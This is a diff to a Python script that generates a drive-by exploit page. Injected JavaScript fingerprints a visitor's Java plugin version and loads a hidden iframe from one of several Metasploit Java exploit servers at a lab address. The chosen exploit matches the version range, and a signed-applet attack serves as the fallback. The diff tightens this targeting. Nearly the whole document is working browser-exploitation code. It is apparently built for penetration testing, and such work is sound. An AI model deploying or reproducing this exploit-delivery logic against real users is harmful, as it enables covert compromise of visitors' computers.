@@ -5,7 +5,7 @@ import string,cgi,time,urlparse,commands,os,subprocess
 from os import curdir, sep
 import sys
 
-javaSelfsigned=True
+javaSelfsigned=False
 msfPath="/pentest/metasploit-framework"
 '''
 use exploit/windows/browser/adobe_cooltype_sing
@@ -93,67 +93,60 @@ def modifyHTML(filename):
 		elif line.strip()=="//plugins":
 			content.append(line)
 			content.append("var iframe = document.getElementById('exploit');\n")
-			#content.append("if(plugins[ao[i]]=='java'){\n")
-			#content.append("if(BrowserScanHostDetails[ao[i]]=='1,7,0,0'){\n")
-			#content.append("'http://172.16.91.187:8081/exploit';\n")
-			#content.append("iframe.setAttribute('src',url);\n")
-			#content.append("iframe.contentDocument.location.reload(true);\n")
-			#content.append("}\n")
-			#content.append("}\n")
+			content.append("var iframesigned = document.getElementById('signed');\n")
+
+			content.append("plugin=plugins[ao[i]];\n")
 			content.append("verSplit=BrowserScanHostDetails[ao[i]].split(',');\n")
 			content.append("verMaj = verSplit[0]+','+verSplit[1]+','+verSplit[2];\n")
 			content.append("verMin = verSplit[3];\n")
+			#content.append("if(plugin=='java'){alert(verMaj+'\t'+verMin);}\n")
 			#content.append("alert(verMaj);\n")
 			#content.append("alert(verMin);\n")
 
 			content.append("url = 'http://172.16.91.187:8085/java_jre17_reflection_types';\n")
-			content.append("if(verMaj=='1,7,0'){if(verMin<22){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+			content.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin>0 && verMin<22){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
 
 			content.append("url = 'http://172.16.91.187:8084/java_jre17_provider_skeleton';\n")
-			content.append("if(verMaj=='1,7,0'){if(verMin>0 && verMin<12){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-			content.append("if(verMaj=='1,7,0'){if(verMin>0 && verMin<12){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-			content.append("if(verMaj=='1,7,0'){if(verMin>0 && verMin<12){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+			content.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin>-1 && verMin<12){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
 
 			content.append("url = 'http://172.16.91.187:8082/java_jre17_jmxbean_2';\n")
-			content.append("if(verMaj=='1,7,0'){if(verMin>0 && verMin<12){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+			content.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin>0 && verMin<12){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
 
 			content.append("url = 'http://172.16.91.187:8086/java_rhino';\n")
-			content.append("if(verMaj=='1,6,0'){if(verMin>0 && verMin<28){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+			content.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin>0 && verMin<28){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
 
 			content.append("url = 'http://172.16.91.187:8083/java_jre17_method_handle';\n")
-			content.append("if(verMaj=='1,7,0'){if(verMin>0 && verMin<8){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-			content.append("if(verMaj=='1,7,0'){if(verMin>0 && verMin<22){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-			content.append("if(verMaj=='1,6,0'){if(verMin>3 && verMin<28){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+			content.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin>0 && verMin<8){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+			content.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin>0 && verMin<22){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+			content.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin>3 && verMin<28){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
 
 			content.append("url = 'http://172.16.91.187:8092/java_verifier_field_access';\n")
-			content.append("if(verMaj=='1,6,0'){if(verMin==32){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-			content.append("if(verMaj=='1,7,0'){if(verMin==4){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-			content.append("if(verMaj=='1,5,0'){if(verMin==35){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+			content.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin==32){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+			content.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin==4){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+			content.append("if(plugin=='java' && verMaj=='1,5,0'){if(verMin==35){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
 
 			content.append("url = 'http://172.16.91.187:8091/java_trusted_chain';\n")
-			content.append("if(verMaj=='1,6,0'){if(verMin>0 && verMin<19){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-			content.append("if(verMaj=='1,5,0'){if(verMin>0 && verMin<24){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-			content.append("if(verMaj=='1,4,2'){if(verMin>0 && verMin<10){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+			content.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin>0 && verMin<19){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+			content.append("if(plugin=='java' && verMaj=='1,5,0'){if(verMin>0 && verMin<24){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+			content.append("if(plugin=='java' && verMaj=='1,4,2'){if(verMin>0 && verMin<10){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
 
 			content.append("url = 'http://172.16.91.187:8090/java_storeimagearray';\n")
-			content.append("if(verMaj=='1,5,0'){if(verMin>35 && verMin<46){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-			content.append("if(verMaj=='1,6,0'){if(verMin>21 && verMin<46){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-			content.append("if(verMaj=='1,7,0'){if(verMin>-1 && verMin<22){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+			content.append("if(plugin=='java' && verMaj=='1,5,0'){if(verMin>35 && verMin<46){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+			content.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin>21 && verMin<46){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+			content.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin>0 && verMin<22){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
 
 			content.append("url = 'http://172.16.91.187:8088/java_setdifficm_bof';\n")
-			content.append("if(verMaj=='1,6,0'){if(verMin>0 && verMin<17){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-			content.append("if(verMaj=='1,5,0'){if(verMin>0 && verMin<22){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-			content.append("if(verMaj=='1,4,0'){if(verMin>0 && verMin<25){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+			content.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin>0 && verMin<17){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+			content.append("if(plugin=='java' && verMaj=='1,5,0'){if(verMin>0 && verMin<22){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+			content.append("if(plugin=='java' && verMaj=='1,4,0'){if(verMin>0 && verMin<25){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
 			
 			content.append("url = 'http://172.16.91.187:8087/java_rmi_connection_impl';\n")
-			content.append("if(verMaj=='1,6,0'){if(verMin>-1 && verMin<19){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+			content.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin>-1 && verMin<19){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
 
 			#If all else fails, let's use the java signed applet
-			content.append("url = 'http://172.16.91.187:8089/java_signed_applet';\n")
-			content.append("if(verMaj=='1,7,0'){if(verMin>22){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-			content.append("if(verMaj=='1,6,0'){if(verMin>46){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-			content.append("if(verMaj=='1,5,0'){if(verMin>46){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-			content.append("if(verMaj=='1,4,0'){if(verMin>25){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+			if(javaSelfsigned==True):	
+				content.append("url = 'http://172.16.91.187:8089/java_signed_applet';\n")
+				content.append("if(plugin=='java'){{iframesigned.setAttribute('src',url);iframesigned.contentDocument.location.reload(true);}};\n")
 
 		else:
 			content.append(line)
